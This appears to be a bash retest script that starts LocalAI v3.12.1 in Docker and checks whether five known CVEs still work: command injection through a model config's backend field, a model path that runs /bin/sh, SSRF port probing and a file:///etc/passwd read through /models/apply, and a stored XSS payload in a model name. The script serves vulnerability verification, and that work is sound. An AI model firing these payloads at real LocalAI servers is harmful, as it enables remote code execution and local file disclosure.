#!/bin/bash
# Retest known LocalAI CVE patterns against v3.12.1
set -e

PORT=11480
CONTAINER=localai-v3121-retest
DIR="$(cd "$(dirname "$0")" && pwd)"

RESULT_5181="SKIPPED"
RESULT_6983="SKIPPED"
RESULT_6095_SSRF="SKIPPED"
RESULT_6095_LFI="SKIPPED"
RESULT_48057="SKIPPED"

echo "=============================================="
echo "LocalAI v3.12.1 Vulnerability Retest"
echo "=============================================="

# Step 1: Start LocalAI
echo ""
echo "[1/6] Starting LocalAI v3.12.1..."
cd "$DIR"
docker compose up -d
echo "Waiting 15s for LocalAI to initialize..."
sleep 15

# Verify LocalAI is running
if ! curl -sf "http://localhost:$PORT/readyz" > /dev/null 2>&1; then
    echo "Trying /v1/models instead..."
    if ! curl -sf "http://localhost:$PORT/v1/models" > /dev/null 2>&1; then
        echo "ERROR: LocalAI not responding on port $PORT"
        docker compose logs --tail 30
        exit 1
    fi
fi
echo "LocalAI is running on port $PORT"

# ======================================================================
# Test 2: CVE-2024-5181 (Command Injection via backend parameter)
# Pattern: backend parameter in model config used in subprocess command
# Fixed in: commit 1a3dede (added validation)
# ======================================================================
echo ""
echo "=============================================="
echo "[2/6] Testing CVE-2024-5181 (command injection via backend)"
echo "=============================================="

# Create a malicious model config with command injection in backend
mkdir -p "$DIR/models"
cat > "$DIR/models/test-cmdinject.yaml" <<'YAML'
name: test-cmdinject
backend: "llama-cpp; touch /tmp/pwned_5181; echo"
parameters:
  model: dummy.gguf
YAML

# Try to use the model (this triggers backend loading)
RESP=$(curl -sf -X POST "http://localhost:$PORT/v1/chat/completions" \
    -H "Content-Type: application/json" \
    -d '{"model":"test-cmdinject","messages":[{"role":"user","content":"test"}]}' \
    2>&1 || true)
sleep 2

# Check if the command was executed
if docker exec $CONTAINER test -f /tmp/pwned_5181 2>/dev/null; then
    echo "RESULT: /tmp/pwned_5181 EXISTS - COMMAND INJECTION STILL WORKS!"
    RESULT_5181="VULNERABLE"
else
    echo "RESULT: /tmp/pwned_5181 does not exist - command injection blocked"
    RESULT_5181="NOT_VULNERABLE"
fi
echo "  Response: $(echo "$RESP" | head -c 200)"

# ======================================================================
# Test 3: CVE-2024-6983 (RCE via model parameter)
# Pattern: model parameter used as modelPath to run malicious binaries
# Fixed in: PR #2647 (guard against running backends outside asset dir)
# ======================================================================
echo ""
echo "=============================================="
echo "[3/6] Testing CVE-2024-6983 (RCE via model path)"
echo "=============================================="

# Create model config pointing to /bin/sh as the "model"
cat > "$DIR/models/test-modelpath.yaml" <<'YAML'
name: test-modelpath
backend: llama-cpp
parameters:
  model: "/bin/sh -c 'touch /tmp/pwned_6983'"
YAML

RESP=$(curl -sf -X POST "http://localhost:$PORT/v1/chat/completions" \
    -H "Content-Type: application/json" \
    -d '{"model":"test-modelpath","messages":[{"role":"user","content":"test"}]}' \
    2>&1 || true)
sleep 2

if docker exec $CONTAINER test -f /tmp/pwned_6983 2>/dev/null; then
    echo "RESULT: /tmp/pwned_6983 EXISTS - MODEL PATH RCE STILL WORKS!"
    RESULT_6983="VULNERABLE"
else
    echo "RESULT: /tmp/pwned_6983 does not exist - model path RCE blocked"
    RESULT_6983="NOT_VULNERABLE"
fi
echo "  Response: $(echo "$RESP" | head -c 200)"

# ======================================================================
# Test 4: CVE-2024-6095 (SSRF via /models/apply)
# Pattern: url parameter accepts http:// for port scanning
# Fixed in: v2.17.0
# ======================================================================
echo ""
echo "=============================================="
echo "[4/6] Testing CVE-2024-6095 (SSRF via /models/apply)"
echo "=============================================="

# Try SSRF: use http:// URL to probe open vs closed internal ports
# Open port (8080 = LocalAI itself)
RESP_OPEN=$(curl -sf -X POST "http://localhost:$PORT/models/apply" \
    -H "Content-Type: application/json" \
    -d '{"url":"http://127.0.0.1:8080/readyz"}' 2>&1 || true)
JOB_OPEN=$(echo "$RESP_OPEN" | python3 -c "import sys,json; print(json.load(sys.stdin).get('status',''))" 2>/dev/null || true)
sleep 3
MSG_OPEN=$(curl -sf "$JOB_OPEN" 2>&1 | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('message',''))" 2>/dev/null || true)

# Closed port (9999)
RESP_CLOSED=$(curl -sf -X POST "http://localhost:$PORT/models/apply" \
    -H "Content-Type: application/json" \
    -d '{"url":"http://127.0.0.1:9999/"}' 2>&1 || true)
JOB_CLOSED=$(echo "$RESP_CLOSED" | python3 -c "import sys,json; print(json.load(sys.stdin).get('status',''))" 2>/dev/null || true)
sleep 3
MSG_CLOSED=$(curl -sf "$JOB_CLOSED" 2>&1 | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('message',''))" 2>/dev/null || true)

echo "  Open port (8080): $MSG_OPEN"
echo "  Closed port (9999): $MSG_CLOSED"

if echo "$MSG_CLOSED" | grep -q "connection refused" 2>/dev/null; then
    echo "RESULT: SSRF confirmed - different responses for open/closed ports (port scanning)"
    RESULT_6095_SSRF="VULNERABLE"
elif echo "$MSG_OPEN" | grep -q "completed\|yaml" 2>/dev/null; then
    echo "RESULT: SSRF likely - server processed internal URL"
    RESULT_6095_SSRF="POSSIBLE"
else
    echo "RESULT: SSRF appears blocked"
    RESULT_6095_SSRF="NOT_VULNERABLE"
fi

# ======================================================================
# Test 5: CVE-2024-6095 (LFI via /models/apply file://)
# Pattern: url parameter accepts file:// for local file inclusion
# ======================================================================
echo ""
echo "=============================================="
echo "[5/6] Testing CVE-2024-6095 (LFI via file:// URL)"
echo "=============================================="

# Submit file:// URL and check async job result
RESP=$(curl -sf -X POST "http://localhost:$PORT/models/apply" \
    -H "Content-Type: application/json" \
    -d '{"url":"file:///etc/passwd"}' 2>&1 || true)
JOB_LFI=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('status',''))" 2>/dev/null || true)
sleep 3
MSG_LFI=$(curl -sf "$JOB_LFI" 2>&1 | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('message',''))" 2>/dev/null || true)
echo "  Job result: $MSG_LFI"

if echo "$MSG_LFI" | grep -qi "root:" 2>/dev/null; then
    echo "RESULT: /etc/passwd content leaked - LFI STILL WORKS!"
    RESULT_6095_LFI="VULNERABLE"
elif echo "$MSG_LFI" | grep -qi "outside.*trusted\|not allowed\|blocked" 2>/dev/null; then
    echo "RESULT: file:// URL blocked (path trust validation)"
    RESULT_6095_LFI="NOT_VULNERABLE"
else
    echo "RESULT: Unclear (check job result above)"
    RESULT_6095_LFI="UNCLEAR"
fi

# ======================================================================
# Test 6: CVE-2024-48057 (Stored XSS via model name)
# Pattern: Model install with XSS payload in name, rendered on homepage
# ======================================================================
echo ""
echo "=============================================="
echo "[6/6] Testing CVE-2024-48057 (XSS via model name)"
echo "=============================================="

# Try the XSS payload via model install endpoint
RESP=$(curl -sf -X POST "http://localhost:$PORT/browse/install/model/<img src=x onerror=alert(1)>" \
    -H "HX-Request: true" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    2>&1 || true)

if echo "$RESP" | grep -qi "<img\|onerror\|alert" 2>/dev/null; then
    echo "RESULT: XSS payload reflected in response - XSS POSSIBLE!"
    RESULT_48057="VULNERABLE"
elif echo "$RESP" | grep -qi "error\|not found\|sanitized\|encoded" 2>/dev/null; then
    echo "RESULT: XSS payload appears sanitized or endpoint not found"
    RESULT_48057="NOT_VULNERABLE"
else
    echo "RESULT: Unclear (check response)"
    RESULT_48057="UNCLEAR"
fi
echo "  Response: $(echo "$RESP" | head -c 300)"

# Summary
echo ""
echo "=============================================="
echo "SUMMARY - LocalAI v3.12.1"
echo "=============================================="
echo "  CVE-2024-5181  (cmd injection):  $RESULT_5181"
echo "  CVE-2024-6983  (model path RCE): $RESULT_6983"
echo "  CVE-2024-6095  (SSRF):           $RESULT_6095_SSRF"
echo "  CVE-2024-6095  (LFI):            $RESULT_6095_LFI"
echo "  CVE-2024-48057 (stored XSS):     $RESULT_48057"

echo ""
echo "Collecting relevant logs..."
docker compose logs --tail 50 > "$DIR/poc/localai-logs.txt" 2>&1 || true

echo ""
echo "Stopping container..."
docker compose down
echo "Done."
